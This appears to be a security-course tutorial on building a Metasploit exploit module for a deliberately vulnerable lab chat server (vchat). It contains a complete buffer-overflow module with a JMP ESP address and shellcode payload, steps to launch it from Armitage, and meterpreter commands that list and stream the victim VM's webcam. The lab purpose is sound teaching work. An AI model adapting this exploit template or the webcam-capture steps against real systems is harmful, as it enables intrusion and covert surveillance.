# Creating a Metasploit module against our vulnerable chat server
Our customized Kali VM is used in this project. The new exploit module is against our vulnerable chat server <a href="https://github.com/xinwenfu/Malware-Analysis/tree/main/vchat/Server">vchat</a>.

[![Video demo of creating metasploit new module](https://img.youtube.com/vi/uln-HK9J07Q/0.jpg)](https://youtu.be/uln-HK9J07Q)

## Update metasploit
The default version of Metasploit installed on some Kali machines may has some issues integrating newly created modules in a user folder. For example, it cannot incorporate such modules into the exploit database. Updating the metasploit-framework solves such issue. On a Kali Linux machine you can use the following command to update the Metasploit Framework

```
sudo apt update; sudo apt install metasploit-framework 
```

If a module is then copied to the [metasploit modules folder](https://www.offensive-security.com/metasploit-unleashed/modules-and-locations/) (e.g. /usr/share/metasploit-framework/modules/), there should be no such module incorporating issue. 

## Create a custom module

We have two choices, creating a new module, which can be used by everyone or only the logged-in user. Both options are listed below however the first choice is preferred.

1. Create a new module that can be used by everyone. The new module shall stay in a subfolder of */usr/share/metasploit-framework/modules/*. The subfolders located within are used to categorize the modules.

    We will put our vulnserver modules including *knock.rb* in the folder */usr/share/metasploit-framework/modules/exploits/windows/vchat/*. Preform the following commands within a *terminal* where "#" signifies the start of a comment.
    ```sh
    sudo su	# become root
    mkdir -p /usr/share/metasploit-framework/modules/exploits/windows/vchat/ # create the folder holding modules for vulnserver
    cd /usr/share/metasploit-framework/modules/exploits/windows/vchat/
    mousepad knock.rb # copy and paste the knock.rb code, save the file and exit
    ``` 

2. Create a module which can be used by only the logged-in user (e.g. kali) in *~/.msf4/modules*, for example, */home/kali/.msf4/modules/exploits/windows/vchat/[knock.rb](knock.rb)*, which is the example module located in this repository. The exploit module is similar to the [Python version of the attack](https://github.com/xinwenfu/Malware-Analysis/tree/main/Buffer-Overflow/BOF-Remote).

    We will put our vulnserver modules including *knock.rb* in the folder *home/kali/.msf4/modules/exploits/windows/vchat/*. Preform the following commands within a *terminal* where "#" signifies the start of a comment.
    ```sh
    sudo su	# become root
    mkdir -p /home/kali/.msf4/modules/exploits/windows/vchat/ # create the folder holding modules for vulnserver
    cd /home/kali/.msf4/modules/exploits/windows/vchat/
    mousepad knock.rb # copy and paste the knock.rb code, save the file and exit
    ``` 

In an ongoing Metasploit session, if a module is changed, use the following command within the Metasploit console to reload/refresh all modules
```
reload_all
```

Below is the [new module](knock.rb) code with some comments. This code can be used as a template to write exploit modules.
```rb
##
# The # symbol starts a comment
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: .msf4/modules/exploits/windows/vchat/knock.rb
##
# This module exploits the KNOCK command of vulnserver
##

class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking	# Potential impact to the target

  include Msf::Exploit::Remote::Tcp	# Include remote tcp exploit module

  def initialize(info = {})	# i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'Vulnserver Buffer Overflow-KNOCK command',	# Name of the target
      'Description'    => %q{
         vulnserver is intentionally written vulnerable.
      }, # Explaining what the module does
      'Author'         => [ 'fxw' ],	## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>	# References for the vulnerability or exploit
        [
          [ 'URL', 'https://github.com/xinwenfu/Malware-Analysis/edit/main/MetasploitNewModule' ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done 
        },      
      'Payload'        =>	# How to encode and generate the payload
        {
 #         'Space'    => 5000,	# Space that can hold shellcode? No need in this exploit
          'BadChars' => "\x00\x0a"	# Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>	#  targets for many exploits
        [
          [ 'vulnserver-KNOCK',
            {
              'jmpesp' => 0x6250151C # This will be available in [target['jmpesp']]
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))	# When the vulnerability was disclosed in public


    register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
      [
        Opt::RPORT(9999),
	    Opt::LPORT(11111)
      ])
  end

  def exploit	# Actual exploit
    print_status("Connecting to target...")
    connect	# Connect to the target

#    sock.get_once # poll the connection and see availability of any read data one time
	  
    shellcode = payload.encoded	# Generated and encoded shellcode
    outbound = "KNOCK /.:/" + "A"*2002 + [target['jmpesp']].pack('V') + "C"*32 + shellcode # Create the malicious string that will be sent to the target

    print_status("Trying target #{target.name}...")

    sock.put(outbound)	# Send the attacking payload

#    handler	# A handler is a process listening for and respondsing to connections from the target
    disconnect	# disconnect the connection
  end
end
```
Once a new module is successfully created, it can be used within both Metasploit and Armitage.

## Use the new module

### Configure Armitage to run as root
Change the original Armitage launching command by right clicking the Armitage icon and select *Edit Application ...* as shown below.

<img src="../imgs/armitage-edit-start.png" width=400>


Modify the start command from:
```
sh -c "pkexec msfdb init && armitage"
```
to be:
```
sudo sh -c "pkexec msfdb init && armitage"
```
In this way, we run Armitage as root, removing a lot of possible issues we would otherwise face.

### Run the module
First if you have yet to do so already you should assign the OS of the target machine manually or with a NMap Scan as shown below; You should select *Intense Scan* or *Quick Scan (OS detect)*, This allows the *Find Attacks* Armitage command to locate the exploit modules in the windows subfolder.

<img src="../imgs/armitage-nmap-scan.png">

Below is a screenshot showing how Armitage can find the vchat attack module **knock**. In cases where Armitage cannot find the module, in the top left module panel, find it via expanding the folders *exploit* -> *Windows* -> *vchat* -> *knock*, which corresponds to where we put the ruby module, and double click *knock* to start it.

<img src="../imgs/armitage-find-vulnserver-attack.png">

### Start meterpreter shell
Below is a screenshot showing Armitage where we successfully launched the vulnserver attack and we can start a **meterpreter shell** to list webcams on the target Windows 10 VM. Remember attach the webcam to the Windows 10 VM: *Devices* -> *Webcams* -> Click one. The first *webcam_list* command failed because I forgot to attach any camera to the Windows 10 VM.

<img src="../imgs/armitage-find-vulnserver-meterpreter.png">

*webcam_stream* can be used in the meterpreter shell too. If the command does not work, try a few times.

## Notes
### Ruby programming for metasploit modules
In the Ruby script, we can use the [register_options](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Opt) function to register a few user-controlled options. Available options include: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), and SSLVersion().![Alt text](image.png)
```rb
register_options(
	[
		Opt::RPORT(9999),
		Opt::LPORT(11111)
    ])
```

### Error running command webcam_stream: Errno::EACCES Permission denied @ rb_sysopen - rGwUKerZ.html
Within a meterpreter session, running the *webcam_stream* command may have the *EACCES Permission denied* error. This is because when run by the user *kali*, meterpreter has the working folder of */usr/share/armitage*, which has the root privileges and cannot be used or edited by the user kali since *webcam_stream* needs to create a html file showing the streaming video in the working folder.


The screenshot below shows the error.

<img src="../imgs/webcam_stream_error.png">

There are two solutions:
1. Change the original Armitage launching command by right clicking the Armitage icon and select *Edit Application ...* as shown below.

    <img src="../imgs/armitage-edit-start.png">

	Modify the start command from:
	```
	sh -c "pkexec msfdb init && armitage"
	```
	to be:
	```
	sudo sh -c "pkexec msfdb init && armitage"
	```
	In this way, we run Armitage as root, removing a lot of possible issues we would otherwise face.

2. Within the meterpreter session, use `lcd /home/kali` to change the working folder to the home folder of the user kali. Then we can deploy *webcam_stream* again. However, you may have to wait for a long time until the streaming starts. No idea why yet. The screenshot above demonstrates the option.

## References
1. [Building A Metasploit Module](https://www.offensive-security.com/metasploit-unleashed/building-module/)
2. [Exploiting Simple Buffer Overflow (3) - Writing a simple Metasploit module](https://taishi8117.github.io/2016/07/24/bof-metasploit/), 24 Jul 2016
3. Peleus, [Converting Metasploit Module to Stand Alone](https://netsec.ws/?p=262)
4. v4L, [What Is Metasploit EXITFUNC?](https://www.hacking-tutorial.com/tips-and-trick/what-is-metasploit-exitfunc/#sthash.zpY6gQrl.Mz7vtiHY.dpbs)
5. [rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework/wiki/), Metasploit Development
6. Ivan, [Rewriting a Ruby msf exploit in Python](https://ivanitlearning.wordpress.com/2019/09/01/rewriting-a-ruby-msf-exploit-in-python/), September 1, 2019
7. [Incident Response and the ATT&CK Matrix 2020 CTF](https://samsclass.info/152/IR2020.htm), Writing a Custom Metasploit Module
8. [Ruby metasploit-framework class list](https://www.rubydoc.info/github/rapid7/metasploit-framework/)
